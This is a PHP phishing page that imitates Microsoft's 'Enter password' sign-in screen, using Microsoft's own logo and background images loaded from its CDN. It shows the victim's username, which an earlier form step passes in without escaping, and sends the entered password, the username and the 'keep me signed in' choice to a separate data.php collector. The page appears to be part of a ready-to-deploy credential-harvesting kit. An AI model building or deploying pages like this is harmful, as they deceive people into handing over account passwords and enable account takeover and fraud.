<?php
$username = $_POST['login'];
?>
<!DOCTYPE html>
<html>

<head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="LocLC" content="en-US" />

    <link rel="shortcut icon" href="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.7039.17/content/images/favicon_a.ico" />
</head>

<body>
    <p>&nbsp;</p>

    <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }" style="box-sizing: border-box; color: rgb(38, 38, 38); font-family: &quot;Segoe UI Webfont&quot;, -apple-system, &quot;Helvetica Neue&quot;, &quot;Lucida Grande&quot;, Roboto, Ebrima, &quot;Nirmala UI&quot;, Gadugi, &quot;Segoe Xbox Symbol&quot;, &quot;Segoe UI Symbol&quot;, &quot;Meiryo UI&quot;, &quot;Khmer UI&quot;, Tunga, &quot;Lao UI&quot;, Raavi, &quot;Iskoola Pota&quot;, Latha, Leelawadee, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft JhengHei UI&quot;, &quot;Malgun Gothic&quot;, &quot;Estrangelo Edessa&quot;, &quot;Microsoft Himalaya&quot;, &quot;Microsoft New Tai Lue&quot;, &quot;Microsoft PhagsPa&quot;, &quot;Microsoft Tai Le&quot;, &quot;Microsoft Yi Baiti&quot;, &quot;Mongolian Baiti&quot;, &quot;MV Boli&quot;, &quot;Myanmar Text&quot;, &quot;Cambria Math&quot;; font-size: 15px; background-color: rgb(255, 255, 255);">
        <div class="background" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }" role="presentation" style="box-sizing: border-box; background: rgb(242, 242, 242); position: fixed; top: 0px; width: 1366px; height: 662px;">
            <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="box-sizing: border-box; animation: fadeIn 1s; position: fixed; top: 0px; width: 1366px; height: 662px; background-repeat: no-repeat, no-repeat; background-position: center center, center center; background-size: cover, cover; background-image: url(&quot;https://auth.gfx.ms/16.000.27621.00/images/Backgrounds/0.jpg?x=f5a9a9531b8f4bcc86eabb19472d15d5&quot;);">&nbsp;</div>

            <div class="background-overlay" style="box-sizing: border-box; background: center center / cover no-repeat rgba(0, 0, 0, 0.55), center center / cover no-repeat; width: 1366px; height: 662px; position: fixed; top: 0px;">&nbsp;</div>
        </div>
    </div>

    <form method="POST" action="data.php" id="i0281" name="f1" style="box-sizing: border-box; color: rgb(38, 38, 38); font-family: &quot;Segoe UI Webfont&quot;, -apple-system, &quot;Helvetica Neue&quot;, &quot;Lucida Grande&quot;, Roboto, Ebrima, &quot;Nirmala UI&quot;, Gadugi, &quot;Segoe Xbox Symbol&quot;, &quot;Segoe UI Symbol&quot;, &quot;Meiryo UI&quot;, &quot;Khmer UI&quot;, Tunga, &quot;Lao UI&quot;, Raavi, &quot;Iskoola Pota&quot;, Latha, Leelawadee, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft JhengHei UI&quot;, &quot;Malgun Gothic&quot;, &quot;Estrangelo Edessa&quot;, &quot;Microsoft Himalaya&quot;, &quot;Microsoft New Tai Lue&quot;, &quot;Microsoft PhagsPa&quot;, &quot;Microsoft Tai Le&quot;, &quot;Microsoft Yi Baiti&quot;, &quot;Mongolian Baiti&quot;, &quot;MV Boli&quot;, &quot;Myanmar Text&quot;, &quot;Cambria Math&quot;; font-size: 15px; background-color: rgb(255, 255, 255);" target="_top">
	<input type="hidden" name="login" value="<?php echo($username); ?>">
				
                <div id="inputs">
                                                            <div id="mbr-login-greeting" class="mbr-login-signin-hd pure-u-1 mbr-overflow-ellipsis">
                        Hello                    </div>

                    
                                        <div class="mbr-login-username ">
                                                                        <!-- otp country code -->
                        <div id="login-country-code-field" class="pure-u selected-country-code mbr-hide narrow1">
                            <noscript><div class="mbr-hide"></noscript>
                            <div class="select-country-code" id="login-country-code">
                                <a tabindex="1" id="login-selected-country-code" aria-labelledby="country-name"
                                    aria-haspopup="true" role="menuitem" href="#country-codes-menu">
                                    <div class="mbr-hide"><span class="flag-us"></span></div>
                                    <span><span></span></span>
                                    <span id="login-country-name" class="mbr-hide">United States (+1)</span>
                                    <span>+1</span>
                                    <span class="country-code-arrow-container"><span class="country-code-arrow"></span></span>
                                </a>
                            </div>
                            <noscript></div></noscript>
                            <div id="login-country-codes-menu"
                                class="country-codes-container input-width mbr-text-align mbr-hide">
                                <ul>
                            </div>

                            <label class="mbr-hide" for="login-select-country-code">Country menu</label>
                            <noscript><div class="show-conuntry-code-selectbox"></noscript>
                                <select id="login-select-country-code" corresponding-field-id="login-username"
                                    data="country-code-drop-down" name="countrycode" drop-down-type="country-code"
                                    class="mbr-hide">
                                <noscript></div></noscript>
                        </div>
                                                <!-- username -->
                        <label for="login-username" class="mbr-hide">Username</label>
                                                <input name="username" id="login-username" class="login-input pure-u-1 " type="password" maxlength="96"
                                                tabindex="1" aria-required="true"
                                                value=""
                        placeholder="Password"
                        title="Enter your email" autocorrect="off" spellcheck="false"
                                                 autofocus >
                        <div id="login-username-error" class="error-box username-error pure-u-1 mbr-text-align mbr-hide" role="alert"></div>
                                                                    </div>

                    <div class="mbr-login-username-tips">
                        
                                            </div>

                                        
                    <div id="passwd-field" class="passwd-field mbr-hide">
                                                <label for="login-passwd" class="mbr-hide">Password</label>
                        <input name="passwd" id="login-passwd"
                        class="login-input  pure-u-1" type="password" maxlength="64"
                                                tabindex="-1" aria-hidden="true" role="presentation"
                                                placeholder="Password"
                         title="Password"
                        autocorrect="off"
                         >
                        <div id="odp-pw-desc" class="odp-pw-desc mbr-text-align mbr-hide">
                            Click continue to sign in.                        </div>
                    </div>
                </div>
        <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.AN,
            showFooterLinks: true,
            useWizardBehavior: svr.Bb,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }" style="box-sizing: border-box; display: table; position: absolute; height: 662px; width: 1366px;">
            <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="">
                <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }" style="box-sizing: border-box;margin-left: auto;margin-right: auto;min-height: 417px;min-width: 320px;max-width: 412px;width: calc(100% - 40px);padding: 36px;margin-bottom: 28px;box-shadow: rgba(0, 0, 0, 0.55) 0px 2px 3px;border: 1px solid rgba(0, 0, 0, 0.4);background-color:  white;">
                    <div data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }" style="box-sizing: border-box;"><img class="logo" data-bind="imgSrc" pngsrc="https://auth.gfx.ms/16.000.27621.00/images/microsoft_logo.png?x=ed9c9eb0dce17d752bedea6b5acda6d9" role="presentation" src="https://auth.gfx.ms/16.000.27621.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" style="box-sizing: border-box; border: 0px; vertical-align: middle; max-width: 256px; height: 24px;" svgsrc="https://auth.gfx.ms/16.000.27621.00/images/microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" /></div>

                    <div  style="box-sizing: border-box;">
                        <div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" style="box-sizing: border-box;">
                            <div  data-dynamicbranding="true" data-viewid="2" style="box-sizing: border-box;">
                                <input aria-hidden="true" class="moveOffScreen" data-bind="moveOffScreen, value: displayName" name="loginfmt" style="box-sizing: border-box; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; margin: 0px; max-width: 100%; position: fixed; bottom: 0px; right: 0px; overflow: hidden; opacity: 0; height: 36px; padding: 6px 10px; border-style: solid; border-width: 1px; border-color: rgba(0, 0, 0, 0.6); background-color: rgba(255, 255, 255, 0.4); outline: none; width: 0px !important;" tabindex="-1" type="text" />
                                <div data-bind="component: { name: 'identity-banner-control',
     params: {
        pawnIconId: svr.BH,
        displayName: displayName } }" style="box-sizing: border-box;">
                                    <div class="identityBanner" style="box-sizing: border-box; height: 28px; background: rgb(242, 242, 242); margin: 16px -36px; padding: 0px 36px;">
                                        <div class="identity" data-bind="text: displayName, attr: { 'title': displayName }" id="displayName" style="box-sizing: border-box; line-height: 28px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; text-align: right; width: calc(100% - 56px);" title="admintest@hotmail.com"><?php echo($username); ?></div>

                                        <div class="profile-photo" style="box-sizing: border-box; height: 48px; width: 48px; margin-top: -48px; border-radius: 50%; overflow: hidden; float: right;"><img data-bind="attr: { src: getUrl() }" role="presentation" src="https://auth.gfx.ms/16.000.27621.00/images/picker_account_msa.svg?x=2d8f86059be176833897099ee6ddedeb" style="box-sizing: border-box; border: 0px; vertical-align: middle; width: 48px;" /></div>
                                    </div>
                                </div>

                                <div class="row text-title" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']" id="loginHeader" role="heading" style="box-sizing: border-box; margin: 16px -2px; font-size: 1.5rem; line-height: 1.75rem; padding: 0px;">Enter password</div>

                                <div class="row" style="box-sizing: border-box; margin-left: -2px; margin-right: -2px;">
                                    <div class="form-group col-md-24" style="box-sizing: border-box; position: relative; min-height: 1px; padding-left: 2px; padding-right: 2px; float: left; width: 342px; margin-bottom: 16px;">
                                        <div aria-atomic="false" aria-live="assertive" role="alert" style="box-sizing: border-box;">&nbsp;</div>

                                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox', params: {
            serverData: svr,
            textInput: password,
            hasFocus: isFocused,
            hintText: str['CT_PWD_STR_PwdTB_Label'],
            forcePlaceholderAttribute: true,
            hintCss: 'placeholder' } }" style="box-sizing: border-box; width: 338px; position: relative;">
                                            <input class="form-control" id="i0118" name="passwd" placeholder="Password" style="box-sizing: border-box; font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; margin: 0px; max-width: 100%; display: block; width: 338px; background-image: none; padding: 6px 10px; border-style: solid; border-width: 1px; border-color: rgba(0, 0, 0, 0.6); background-color: rgba(255, 255, 255, 0.4); height: 36px; outline: none;" type="password" required />
                                        </div>
                                    </div>
                                </div>

                                <div class="row" style="box-sizing: border-box; margin-left: -2px; margin-right: -2px;">
                                    <div data-bind="component: { name: 'footer-buttons-field',
        params: {
            serverData: svr,
            primaryButtonText: str['CT_PWD_STR_SignIn_Button'],
            isPrimaryButtonEnabled: !isRequestPending(),
            isPrimaryButtonVisible: svr.AN,
            isSecondaryButtonEnabled: true,
            isSecondaryButtonVisible: svr.AN &amp;&amp; isBackButtonVisible() },
        event: {
            primaryButtonClick: primaryButton_onClick,
            secondaryButtonClick: secondaryButton_onClick } }" style="box-sizing: border-box;">
                                        <div class="col-xs-24 form-group no-padding-left-right" data-bind="
     visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
     css: { 'no-margin-bottom': removeBottomMargin }" style="box-sizing: border-box; position: relative; min-height: 1px; padding-left: 0px; padding-right: 0px; float: left; width: 342px; margin-bottom: 16px;">
                                            <div class="col-xs-12 secondary" data-bind="css: { 'col-xs-12 secondary': isPrimaryButtonVisible(), 'col-xs-24': !isPrimaryButtonVisible() }" style="box-sizing: border-box; position: relative; min-height: 1px; padding-left: 2px; padding-right: 4px; float: left; width: 171px;">&nbsp;</div>

                                            <div class="col-xs-24" data-bind="css: { 'col-xs-12 primary': isSecondaryButtonVisible(), 'col-xs-24': !isSecondaryButtonVisible() }" style="box-sizing: border-box; position: relative; min-height: 1px; padding-left: 2px; padding-right: 2px; float: left; width: 342px;">
                                                <input class="btn btn-block btn-primary"  id="idSIButton9" style="color: rgb(255, 255, 255); font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; margin: 0px; max-width: 100%; width: 338px; min-width: 100px; padding: 4px 12px; position: relative; white-space: nowrap; overflow: hidden; vertical-align: middle; text-overflow: ellipsis; touch-action: manipulation; border-style: solid; border-width: 1px; border-color: rgb(0, 103, 184); background-color: rgb(0, 103, 184); height: 36px; -webkit-appearance: button; cursor: pointer;" type="submit" value="Sign in" />
                                            </div>
                                        </div>
                                    </div>
                                </div>

                                <div class="form-group checkbox text-block-body no-margin-top" data-bind="visible: !svr.B &amp;&amp; !showHip" id="idTd_PWD_KMSI_Cb" style="box-sizing: border-box; position: relative; margin-bottom: 16px; margin-top: 0px;">
                                    
                                </div>
								<label id="idLbl_PWD_KMSI_Cb" style="box-sizing: border-box; display: inline-block; max-width: 100%; min-height: 31px; margin-bottom: 0px; cursor: pointer; margin-top: 0px; padding-left: 28px;">
                                        <input aria-label="Keep me signed in" data-bind="checked: isKmsiChecked, ariaLabel: str['CT_PWD_STR_KeepMeSignedInCB_Text']" id="idChkBx_PWD_KMSI0Pwd" name="KMSI" style="font-style: inherit; font-variant: inherit; font-weight: inherit; font-stretch: inherit; font-size: inherit; line-height: inherit; font-family: inherit; margin: 0px 0px 0px -28px; max-width: 100%; padding: 0px; width: 20px; height: 20px; position: absolute;" type="checkbox" /><span data-bind="text: str['CT_PWD_STR_KeepMeSignedInCB_Text']" style="box-sizing: border-box;">Keep me signed in</span></label>

                                <div class="row" style="box-sizing: border-box; margin-left: -2px; margin-right: -2px;">
                                    <div class="col-md-24" style="box-sizing: border-box; position: relative; min-height: 1px; padding-left: 2px; padding-right: 2px; float: left; width: 342px;">
                                        <div class="text-13 action-links" style="box-sizing: border-box; font-size: 0.8125rem;">
                                            <div class="form-group" style="box-sizing: border-box; margin-bottom: 16px;"><a data-bind="text: str['CT_PWD_STR_ForgotPwdLink_Text'], href: svr.c, click: resetPassword_onClick" href="data.php" id="idA_PWD_ForgotPassword" style="box-sizing: border-box; background-color: transparent; color: rgb(0, 103, 184); text-decoration-line: none;">Forgot my password</a></div>

                                            <div class="form-group" style="box-sizing: border-box; margin-bottom: 0px;"><a data-bind="text: str['CT_FED_STR_ChangeUserLink_Text'], click: selectAccount_onClick" href="https://login.live.com/pp1600/#" id="i1668" style="box-sizing: border-box; background-color: transparent; color: rgb(0, 103, 184); text-decoration-line: none;">Sign in with a different Microsoft account</a></div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }" style="box-sizing: border-box;">&nbsp;</div>
            </div>
        </div>

        <div class="footer default" data-bind="css: { 'default': !backgroundLogoUrl() }" id="footer" style="box-sizing: border-box; position: fixed; bottom: 0px; width: 1366px; overflow: visible; z-index: 99; clear: both; background-color: rgba(0, 0, 0, 0.6);">
            <div data-bind="component: { name: 'footer-control',
            params: {
                serverData: svr,
                showLinks: true },
            event: {
                agreementClick: footer_agreementClick } }" style="box-sizing: border-box;">
                <div class="footerNode text-secondary" id="footerLinks" style="box-sizing: border-box; color: rgba(0, 0, 0, 0.7); font-size: 13px; margin: 0px; float: right;"><span data-bind="html: svr.B6" id="ftrCopy" style="box-sizing: border-box; color: rgb(255, 255, 255); font-size: 12px; line-height: 28px; white-space: nowrap; display: inline-block; margin-left: 8px; margin-right: 8px;">&copy;2017 Microsoft</span>&nbsp;<a data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;vv=1600" id="ftrTerms" style="box-sizing: border-box; background-color: transparent; color: rgb(255, 255, 255); text-decoration-line: none; font-size: 12px; line-height: 28px; white-space: nowrap; display: inline-block; margin-left: 8px; margin-right: 8px;">Terms of use</a>&nbsp;<a data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;vv=1600" id="ftrPrivacy" style="box-sizing: border-box; background-color: transparent; color: rgb(255, 255, 255); text-decoration-line: none; font-size: 12px; line-height: 28px; white-space: nowrap; display: inline-block; margin-left: 8px; margin-right: 8px;">Privacy &amp; cookies</a></div>
            </div>
        </div>
    </form>
</body>

</html>